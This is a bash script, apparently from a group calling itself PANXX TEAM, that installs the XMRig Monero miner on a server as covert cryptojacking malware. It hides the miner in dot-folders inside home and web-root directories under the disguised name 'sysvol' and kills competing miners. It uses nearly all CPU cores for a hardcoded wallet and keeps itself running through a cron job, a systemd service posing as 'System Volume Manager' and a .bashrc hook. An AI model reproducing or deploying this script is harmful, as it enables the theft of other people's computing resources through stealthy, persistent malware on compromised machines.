#!/bin/bash

################################################################################
# XMRig Deployment Script v12.1 FINAL PRODUCTION
# Aggressive mode untuk CPU BESAR dengan stealth & persistence
# Author: boyyywiliam / PANXX TEAM
################################################################################

set -e

# ═══════════════════════════════════════════════════════════════════════════════
# CONFIGURATION FINAL
# ═══════════════════════════════════════════════════════════════════════════════

WALLET="46Z9A1TZiGJSgJtDtZzar9Lgum3B7xW9eG8TDKKhVW5yhJzX118fS2eep3ry8i7Z6PPwP2P4YDvzS7h9L8Ji43C9Jh9fwPb"
POOL="pool.supportxmr.com:443"
POOL_BACKUP="mine.moneropool.com:443"
SCRIPT_VERSION="12.1-FINAL-PRODUCTION"
LOG_FILE="/tmp/deploy_$(date +%s).log"

XMRIG_VERSIONS=("6.21.0" "6.20.0" "6.19.3" "6.18.0")

declare -a BINARY_SOURCES=(
    "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz"
    "https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-x64.tar.gz"
)

# ═══════════════════════════════════════════════════════════════════════════════
# LOGGING & OUTPUT
# ═══════════════════════════════════════════════════════════════════════════════

log() {
    local timestamp=$(date '+[%Y-%m-%d %H:%M:%S]')
    echo -e "\033[0;36m${timestamp}\033[0m $@" | tee -a "$LOG_FILE"
}

log_success() {
    local timestamp=$(date '+[%Y-%m-%d %H:%M:%S]')
    echo -e "\033[0;32m${timestamp} [✓]\033[0m $@" | tee -a "$LOG_FILE"
}

log_error() {
    local timestamp=$(date '+[%Y-%m-%d %H:%M:%S]')
    echo -e "\033[0;31m${timestamp} [✗]\033[0m $@" | tee -a "$LOG_FILE" >&2
}

log_warn() {
    local timestamp=$(date '+[%Y-%m-%d %H:%M:%S]')
    echo -e "\033[0;33m${timestamp} [!]\033[0m $@" | tee -a "$LOG_FILE"
}

# ═══════════════════════════════════════════════════════════════════════════════
# CLEANUP & TRAP
# ═══════════════════════════════════════════════════════════════════════════════

cleanup_temp() {
    rm -rf /tmp/xmrig_deploy_$$ 2>/dev/null || true
    rm -f /tmp/xm_*.tar.gz 2>/dev/null || true
}

trap cleanup_temp EXIT

# ═══════════════════════════════════════════════════════════════════════════════
# AGGRESSIVE THREAD DETECTION (NO CAPS)
# ═══════════════════════════════════════════════════════════════════════════════

detect_cores() {
    if command -v nproc &>/dev/null; then
        nproc 2>/dev/null || echo 1
    elif [ -f /proc/cpuinfo ]; then
        grep -c ^processor /proc/cpuinfo 2>/dev/null || echo 1
    else
        echo 1
    fi
}

detect_memory_mb() {
    if [ -f /proc/meminfo ]; then
        grep MemTotal /proc/meminfo 2>/dev/null | awk '{print int($2/1024)}' || echo 2048
    elif command -v free &>/dev/null; then
        free -m 2>/dev/null | awk '/^Mem:/{print $2}' || echo 2048
    else
        echo 2048
    fi
}

detect_socket_count() {
    if [ -f /proc/cpuinfo ]; then
        grep "^physical id" /proc/cpuinfo 2>/dev/null | sort -u | wc -l
    else
        echo 1
    fi
}

# AGGRESSIVE THREAD CALCULATION - REMOVED ALL CAPS
detect_optimal_threads_final() {
    local cores=$(detect_cores)
    local mem_mb=$(detect_memory_mb)
    local sockets=$(detect_socket_count)
    
    log "[*] System Analysis:"
    log "[*]   Cores: $cores | Memory: ${mem_mb}MB | Sockets: $sockets"
    
    local threads=$cores
    local memory_threads=$((mem_mb / 200))
    [ "$memory_threads" -lt 1 ] && memory_threads=1
    
    # Strategy: Use maximum available within memory constraints
    if [ "$cores" -ge 32 ] && [ "$mem_mb" -ge 16000 ]; then
        log_success "MASSIVE SYSTEM DETECTED - Using 95% cores ($cores)"
        threads=$((cores * 95 / 100))
        [ "$threads" -lt "$cores" ] && threads=$cores
    elif [ "$cores" -ge 16 ] && [ "$mem_mb" -ge 8000 ]; then
        log_success "LARGE SYSTEM DETECTED - Using 85% cores ($cores)"
        threads=$((cores * 85 / 100))
    elif [ "$cores" -ge 8 ]; then
        log_success "MEDIUM SYSTEM DETECTED - Using all cores ($cores)"
        threads=$cores
    else
        log_warn "SMALL SYSTEM - Using $memory_threads threads (RAM constraint)"
        threads=$memory_threads
    fi
    
    [ "$threads" -lt 1 ] && threads=1
    log "[*] Final thread selection: $threads"
    echo "$threads"
}

# ═══════════════════════════════════════════════════════════════════════════════
# CPU AFFINITY & OPTIMIZATION
# ═══════════════════════════════════════════════════════════════════════════════

generate_thread_affinity() {
    local threads=$1
    local cores=$(detect_cores)
    
    local affinity=""
    local core_idx=0
    
    for i in $(seq 0 $((threads - 1))); do
        local core=$((core_idx % cores))
        [ -z "$affinity" ] && affinity="$core" || affinity="$affinity,$core"
        core_idx=$((core_idx + 1))
    done
    
    echo "$affinity"
}

# ═══════════════════════════════════════════════════════════════════════════════
# DIRECTORY DETECTION & VALIDATION
# ═══════════════════════════════════════════════════════════════════════════════

is_exec_ok() {
    local dir="$1"
    [ -d "$dir" ] || return 1
    [ -w "$dir" ] || return 1
    
    local probe="$dir/.probe_$$"
    printf '#!/bin/sh\nexit 0\n' > "$probe" 2>/dev/null || return 1
    chmod 755 "$probe" 2>/dev/null || { rm -f "$probe"; return 1; }
    
    if "$probe" >/dev/null 2>&1; then
        rm -f "$probe" 2>/dev/null
        return 0
    fi
    
    rm -f "$probe" 2>/dev/null
    return 1
}

find_base_directory() {
    local me=$(whoami)
    local user_home="$HOME"
    
    # Priority list of directories
    local candidates=(
        "${user_home}/.dbus-sys"
        "${user_home}/.cache/.dbus-sys"
        "/var/www/.dbus-sys-${me}"
        "/var/www/html/.dbus-sys"
        "/home/${me}/public_html/.dbus-sys"
        "/srv/www/.dbus-sys"
        "/opt/.dbus-sys"
        "/usr/local/var/.dbus"
        "/tmp/.dbus-sys-$$"
    )
    
    # Add vhosts
    for wr in /var/www/vhosts/*/httpdocs /home/*/public_html /var/www/html; do
        [ -d "$wr" ] && [ -w "$wr" ] 2>/dev/null && candidates+=("${wr}/.dbus-sys")
    done
    
    # Test candidates
    for base in "${candidates[@]}"; do
        local parent=$(dirname "$base")
        
        if [ ! -d "$parent" ]; then
            mkdir -p "$parent" 2>/dev/null || continue
        fi
        
        [ -w "$parent" ] 2>/dev/null || continue
        mkdir -p "$base" 2>/dev/null || continue
        
        if is_exec_ok "$base"; then
            chmod 755 "$base" 2>/dev/null
            echo "$base"
            return 0
        else
            rmdir "$base" 2>/dev/null || true
        fi
    done
    
    log_error "No suitable directory found"
    return 1
}

create_base_structure() {
    local BASE="$1"
    
    for dir in sbin cfg log run tmp; do
        mkdir -p "$BASE/$dir" 2>/dev/null || {
            log_error "Failed to create $BASE/$dir"
            return 1
        }
        chmod 755 "$BASE/$dir" 2>/dev/null || true
    done
    
    return 0
}

# ═══════════════════════════════════════════════════════════════════════════════
# AGGRESSIVE BINARY DOWNLOAD
# ═══════════════════════════════════════════════════════════════════════════════

download_with_retry() {
    local url="$1"
    local output="$2"
    local max_attempts=5
    local attempt=1
    
    rm -f "$output" 2>/dev/null || true
    
    while [ $attempt -le $max_attempts ]; do
        log "[*] Download attempt $attempt/$max_attempts: $url"
        
        # Try curl
        if command -v curl &>/dev/null; then
            if timeout 120 curl -fsSLk -m 120 --retry 2 -o "$output" "$url" 2>/dev/null; then
                if [ -f "$output" ] && [ -s "$output" ]; then
                    log_success "Downloaded (curl): $(du -h "$output" | cut -f1)"
                    return 0
                fi
            fi
        fi
        
        # Try wget
        if command -v wget &>/dev/null; then
            if timeout 120 wget --no-check-certificate -q -O "$output" "$url" 2>/dev/null; then
                if [ -f "$output" ] && [ -s "$output" ]; then
                    log_success "Downloaded (wget): $(du -h "$output" | cut -f1)"
                    return 0
                fi
            fi
        fi
        
        rm -f "$output" 2>/dev/null || true
        
        if [ $attempt -lt $max_attempts ]; then
            sleep $((attempt * 2))
        fi
        
        attempt=$((attempt + 1))
    done
    
    return 1
}

validate_binary() {
    local binary="$1"
    
    [ ! -f "$binary" ] && return 1
    [ ! -x "$binary" ] && chmod +x "$binary" 2>/dev/null
    
    local size=$(stat -c%s "$binary" 2>/dev/null || stat -f%z "$binary" 2>/dev/null || echo 0)
    if [ "$size" -lt 2000000 ]; then
        return 1
    fi
    
    if ! file "$binary" 2>/dev/null | grep -q "ELF\|executable"; then
        return 1
    fi
    
    if ! "$binary" --version >/dev/null 2>&1; then
        return 1
    fi
    
    return 0
}

acquire_xmrig_binary() {
    local BASE="$1"
    local TMPDIR=$(mktemp -d)
    
    for ver in "${XMRIG_VERSIONS[@]}"; do
        local url="https://github.com/xmrig/xmrig/releases/download/v${ver}/xmrig-${ver}-linux-static-x64.tar.gz"
        local tar="$TMPDIR/xmrig-${ver}.tar.gz"
        
        log "[*] Attempting XMRig v${ver}..."
        
        if download_with_retry "$url" "$tar"; then
            if cd "$TMPDIR" 2>/dev/null; then
                if tar -xzf "$tar" 2>/dev/null; then
                    local binary=$(find "$TMPDIR" -name "xmrig" -type f 2>/dev/null | head -1)
                    
                    if [ -n "$binary" ] && validate_binary "$binary"; then
                        cp "$binary" "$BASE/sbin/sysvol" 2>/dev/null
                        chmod 755 "$BASE/sbin/sysvol"
                        log_success "XMRig v${ver} deployed"
                        rm -rf "$TMPDIR"
                        return 0
                    fi
                fi
            fi
        fi
    done
    
    rm -rf "$TMPDIR"
    log_error "All XMRig versions failed"
    return 1
}

# ═══════════════════════════════════════════════════════════════════════════════
# CONFIGURATION GENERATION
# ═══════════════════════════════════════════════════════════════════════════════

generate_config() {
    local BASE="$1"
    local THREADS="$2"
    
    local THREAD_LIST=""
    for i in $(seq 0 $((THREADS - 1))); do
        [ -z "$THREAD_LIST" ] && THREAD_LIST="$i" || THREAD_LIST="$THREAD_LIST,$i"
    done
    
    local WORKER="$(hostname | cut -d. -f1)-$(date +%s | tail -c 5)"
    
    cat > "$BASE/cfg/config.json" << CFGEOF
{
  "autosave": false,
  "version": 1,
  "cpu": {
    "enabled": true,
    "threads": [$THREAD_LIST],
    "huge-pages": true,
    "hw-aes": true,
    "priority": -1,
    "yield": true,
    "asm": "auto",
    "argon2-impl": "auto"
  },
  "opencl": { "enabled": false },
  "cuda": { "enabled": false },
  "donate-level": 1,
  "pools": [
    {
      "algo": "rx/0",
      "url": "$POOL",
      "user": "$WALLET",
      "pass": "$WORKER",
      "tls": true,
      "keepalive": true
    },
    {
      "algo": "rx/0",
      "url": "$POOL_BACKUP",
      "user": "$WALLET",
      "pass": "$WORKER",
      "tls": true,
      "keepalive": true
    }
  ],
  "print-time": 60,
  "log-file": "$BASE/log/core.log",
  "background": false
}
CFGEOF

    chmod 600 "$BASE/cfg/config.json"
    log_success "Configuration generated (threads: $THREADS, worker: $WORKER)"
}

# ═══════════════════════════════════════════════════════════════════════════════
# GUARD & WATCHDOG
# ═══════════════════════════════════════════════════════════════════════════════

create_guard_script() {
    local BASE="$1"
    local THREADS="$2"
    
    cat > "$BASE/run/guard.sh" << 'GRDEOF'
#!/bin/bash
BASE="__BASE_PATH__"
BIN="$BASE/sbin/sysvol"
CFG="$BASE/cfg/config.json"
PID_FILE="$BASE/run/state.pid"
LOG="$BASE/log/core.log"
THREADS="__THREADS__"

# Cleanup
pkill -9 -f "$BIN" 2>/dev/null || true
rm -f "$PID_FILE" 2>/dev/null

# Ensure log directory
mkdir -p "$(dirname "$LOG")" 2>/dev/null

# Calculate aggressive thread hint
HINT=$((THREADS * 20))

log_entry() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $@" >> "$LOG"
}

log_entry "======== MINER STARTUP ========"
log_entry "Threads: $THREADS | Hint: $HINT"

# Start miner with maximum performance settings
nohup "$BIN" \
    -c "$CFG" \
    --cpu-max-threads-hint=$HINT \
    --randomx-1gb-pages \
    >> "$LOG" 2>&1 < /dev/null &

PID=$!
echo "$PID" > "$PID_FILE"
log_entry "Process started: PID=$PID"

# Watchdog loop
while true; do
    sleep 30
    
    if ! kill -0 "$PID" 2>/dev/null; then
        log_entry "Process died, restarting..."
        nohup "$BIN" -c "$CFG" --cpu-max-threads-hint=$HINT --randomx-1gb-pages >> "$LOG" 2>&1 < /dev/null &
        PID=$!
        echo "$PID" > "$PID_FILE"
        log_entry "Restarted: PID=$PID"
    fi
done
GRDEOF

    sed -i "s|__BASE_PATH__|$BASE|g" "$BASE/run/guard.sh"
    sed -i "s|__THREADS__|$THREADS|g" "$BASE/run/guard.sh"
    chmod +x "$BASE/run/guard.sh"
    
    log_success "Guard script created"
}

# ═══════════════════════════════════════════════════════════════════════════════
# PERSISTENCE INSTALLATION
# ═══════════════════════════════════════════════════════════════════════════════

install_persistence_final() {
    local BASE="$1"
    
    log "[*] Installing persistence mechanisms..."
    
    # Cron (minimum 1 minute)
    if command -v crontab &>/dev/null; then
        local cron_line="* * * * * $BASE/run/guard.sh >/dev/null 2>&1"
        (crontab -l 2>/dev/null | grep -v "sysvol\|guard"; echo "$cron_line") | crontab - 2>/dev/null
        
        if crontab -l 2>/dev/null | grep -q "guard.sh"; then
            log_success "Cron installed (1 minute interval)"
        fi
    fi
    
    # Systemd service (if root)
    if [ "$(id -u)" = "0" ] 2>/dev/null; then
        cat > /etc/systemd/system/sysvol.service << SVCEOF 2>/dev/null || true
[Unit]
Description=System Volume Manager
After=network.target

[Service]
Type=simple
ExecStart=$BASE/run/guard.sh
Restart=always
RestartSec=5
StartLimitInterval=0

[Install]
WantedBy=multi-user.target
SVCEOF
        
        systemctl daemon-reload 2>/dev/null || true
        systemctl enable sysvol.service 2>/dev/null || true
        systemctl restart sysvol.service 2>/dev/null || true
        log_success "Systemd service installed"
    fi
    
    # Bashrc injection
    if [ -f "$HOME/.bashrc" ]; then
        if ! grep -q "guard.sh" "$HOME/.bashrc" 2>/dev/null; then
            echo "$BASE/run/guard.sh &" >> "$HOME/.bashrc"
            log_success "Bashrc hook installed"
        fi
    fi
}

# ═══════════════════════════════════════════════════════════════════════════════
# MAIN DEPLOYMENT
# ═══════════════════════════════════════════════════════════════════════════════

main() {
    clear
    log ""
    log "╔═══════════════════════════════════════════════════════════╗"
    log "║     XMRig Deployment v${SCRIPT_VERSION}                  ║"
    log "║     Aggressive Mode - CPU Optimization                    ║"
    log "╚═══════════════════════════════════════════════════════════╝"
    log ""
    
    # Kill existing processes
    log "[*] Cleanup existing miners..."
    pkill -9 -f "sysvol" 2>/dev/null || true
    pkill -9 -f "xmrig" 2>/dev/null || true
    pkill -9 -f "guard.sh" 2>/dev/null || true
    sleep 2
    
    # Find base directory
    log "[*] Locating deployment directory..."
    local BASE
    BASE=$(find_base_directory) || {
        log_error "CRITICAL: No suitable directory found"
        exit 1
    }
    log_success "Base directory: $BASE"
    
    # Create structure
    log "[*] Creating directory structure..."
    create_base_structure "$BASE" || {
        log_error "Failed to create directories"
        exit 1
    }
    
    # Detect system specs
    local CORES=$(detect_cores)
    local MEMORY=$(detect_memory_mb)
    local THREADS=$(detect_optimal_threads_final)
    
    log "[*] System Profile:"
    log "[*]   CPU Cores: $CORES"
    log "[*]   Memory: ${MEMORY}MB"
    log "[*]   Selected Threads: $THREADS"
    
    # Download binary
    log "[*] Acquiring XMRig binary..."
    acquire_xmrig_binary "$BASE" || {
        log_error "CRITICAL: Binary acquisition failed"
        exit 1
    }
    
    # Generate config
    generate_config "$BASE" "$THREADS"
    
    # Create guard
    create_guard_script "$BASE" "$THREADS"
    
    # Start miner
    log "[*] Starting miner..."
    bash "$BASE/run/guard.sh" &
    sleep 5
    
    # Verify
    local PID=$(pgrep -f "$BASE/sbin/sysvol" 2>/dev/null | head -1)
    
    if [ -n "$PID" ]; then
        log ""
        log "╔═══════════════════════════════════════════════════════════╗"
        log "║         ✓ DEPLOYMENT SUCCESSFUL                          ║"
        log "╠═══════════════════════════════════════════════════════════╣"
        log "║ PID: $PID"
        log "║ Base: $BASE"
        log "║ Threads: $THREADS"
        log "║ Pool: $POOL"
        log "║ Config: $BASE/cfg/config.json"
        log "║ Log: $BASE/log/core.log"
        log "╚═══════════════════════════════════════════════════════════╝"
        log ""
        
        # Install persistence
        install_persistence_final "$BASE"
        
        # Show output
        log "[*] Live miner output:"
        sleep 3
        tail -20 "$BASE/log/core.log" 2>/dev/null || log "[!] Log not yet available"
        
        log ""
        log_success "Deployment complete! Log: $LOG_FILE"
        return 0
    else
        log ""
        log "╔═══════════════════════════════════════════════════════════╗"
        log "║         ✗ PROCESS FAILED TO START                        ║"
        log "╚═══════════════════════════════════════════════════════════╝"
        log ""
        
        log "[*] Debug info:"
        [ -f "$BASE/log/core.log" ] && tail -30 "$BASE/log/core.log" || log "[!] No log"
        
        return 1
    fi
}

# Execute
main "$@"